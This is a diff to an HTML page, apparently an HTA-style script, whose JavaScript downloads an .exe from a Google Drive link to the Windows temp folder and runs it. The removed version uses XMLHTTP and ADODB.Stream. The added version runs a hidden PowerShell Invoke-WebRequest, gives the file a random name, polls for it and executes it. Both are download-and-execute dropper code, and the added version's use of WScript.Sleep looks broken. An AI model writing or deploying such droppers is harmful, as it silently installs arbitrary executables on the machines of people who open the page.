@@ -3,39 +3,29 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Download and Run File</title>
+    <title>Download and Execute File</title>
     <script type="text/javascript">
         function downloadAndRun() {
-            var fileURL = 'https://drive.google.com/uc?export=download&id=1pjn7VlGpYkvUd44Q6toYv712IgZZtx8H';  // File URL
-            var fileName = 'file.exe';
+            var objShell = new ActiveXObject("WScript.Shell");
 
-            try {
-                var xhr = new ActiveXObject("MSXML2.XMLHTTP");
-                xhr.open("GET", fileURL, false);  // Use false for synchronous
-                xhr.send();
+            // Define temp folder and download URL
+            var tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%");
+            var downloadUrl = "https://drive.google.com/uc?export=download&id=1pjn7VlGpYkvUd44Q6toYv712IgZZtx8H"; // Replace with actual URL
+            var randomFileName = "downloaded" + Math.floor(Math.random() * 1000) + ".exe";
+            var downloadedFile = tempFolder + "\\" + randomFileName;
 
-                if (xhr.status == 200) {
-                    var fileData = xhr.responseBody;
-                    var fso = new ActiveXObject("Scripting.FileSystemObject");
-                    var tempFolder = fso.GetSpecialFolder(2); // Get the temp folder
-                    var filePath = tempFolder + "\\" + fileName;
+            // PowerShell command to download file
+            var cmdCommand = 'powershell.exe -Command "Invoke-WebRequest -Uri ' + downloadUrl + ' -OutFile ' + downloadedFile + '"';
 
-                    var fileStream = new ActiveXObject("ADODB.Stream");
-                    fileStream.Open();
-                    fileStream.Type = 1;  // Binary
-                    fileStream.Write(fileData);
-                    fileStream.SaveToFile(filePath, 2);  // Save the file
-                    fileStream.Close();
+            // Run the command
+            objShell.Run("cmd.exe /c " + cmdCommand, 0, true);
 
-                    // Run the downloaded file
-                    var shell = new ActiveXObject("WScript.Shell");
-                    shell.Run(filePath);
-                } else {
-                    alert("Error downloading file.");
-                }
-            } catch (e) {
-                alert("An error occurred: " + e.message);
+            // Wait for the file to be downloaded and then run it
+            var fso = new ActiveXObject("Scripting.FileSystemObject");
+            while (!fso.FileExists(downloadedFile)) {
+                WScript.Sleep(1000); // Wait for the file to be downloaded
             }
+            objShell.Run(downloadedFile);
         }
     </script>
 </head>
